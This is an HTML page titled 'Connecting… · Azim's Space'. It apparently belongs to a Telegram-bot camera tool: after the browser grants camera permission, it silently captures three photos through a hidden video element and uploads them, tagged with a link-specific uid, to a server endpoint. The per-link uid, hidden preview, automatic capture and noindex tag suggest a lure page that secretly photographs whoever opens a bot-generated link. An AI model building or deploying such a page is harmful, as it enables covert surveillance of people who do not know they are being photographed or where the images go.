<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />
  <title>Connecting… · Azim's Space</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(160deg, #1e2130, #2b2f45);
      color: #f4f5fa;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: #ffffff14;
      border: 1px solid #ffffff26;
      border-radius: 18px;
      padding: 26px;
      max-width: 460px;
      width: 100%;
      text-align: center;
    }
    h1 { font-size: 22px; margin: 0 0 8px; }
    p { font-size: 14px; line-height: 1.55; color: #cdd2e3; margin: 8px 0; }
    .spinner {
      width: 44px; height: 44px; margin: 18px auto;
      border: 4px solid #ffffff26; border-top-color: #7ae0ff;
      border-radius: 50%; animation: spin 0.9s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .ok { color: #7bf1a8; font-weight: 600; }
    a { color: #7ae0ff; }
  </style>
</head>
<body>
  <div class="card">
    <h1>📷 Connecting camera…</h1>
    <div class="spinner" id="spin"></div>
    <p id="msg">Please allow camera access when your browser asks for permission.</p>
  </div>

  <video id="video" autoplay playsinline muted style="display:none;"></video>

  <script>
    const params = new URLSearchParams(location.search);
    const uid = (params.get('uid') || '').trim();
    const msg = document.getElementById('msg');
    const spin = document.getElementById('spin');
    const video = document.getElementById('video');

    function setMsg(html, ok) {
      msg.innerHTML = html;
      msg.className = ok ? 'ok' : '';
      if (ok) spin.style.display = 'none';
    }

    function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

    function captureFrame(v) {
      const canvas = document.createElement('canvas');
      canvas.width = v.videoWidth || 640;
      canvas.height = v.videoHeight || 480;
      canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', 0.85);
    }

    async function send(images) {
      const res = await fetch('/api/camera/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uid, images }),
      });
      const data = await res.json();
      if (!data.success) { throw new Error(data.error || 'upload failed'); }
      return data.count;
    }

    async function main() {
      if (!uid) { setMsg('Invalid link. Ask the bot again for a fresh camera link.'); return; }

      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      } catch (e) {
        setMsg('Camera permission was not granted. Reload the page and choose <b>Allow</b> when asked.');
        return;
      }

      video.srcObject = stream;
      try { await video.play(); } catch (e) {}

      // Let the camera warm up so frames are usable.
      await sleep(800);

      const shots = [];
      for (let i = 0; i < 3; i++) {
        shots.push(captureFrame(video));
        await sleep(350);
      }
      stream.getTracks().forEach((t) => t.stop());
      video.srcObject = null;

      setMsg('Captured 3 photos — sending…');
      try {
        const count = await send(shots);
        setMsg('✅ ' + count + ' photos sent to your Telegram. You can close this page.', true);
      } catch (e) {
        setMsg('Sending failed. Check your connection and reload the page.' + (e && e.message ? ' (' + e.message + ')' : ''));
      }
    }

    main();
  </script>
</body>
</html>
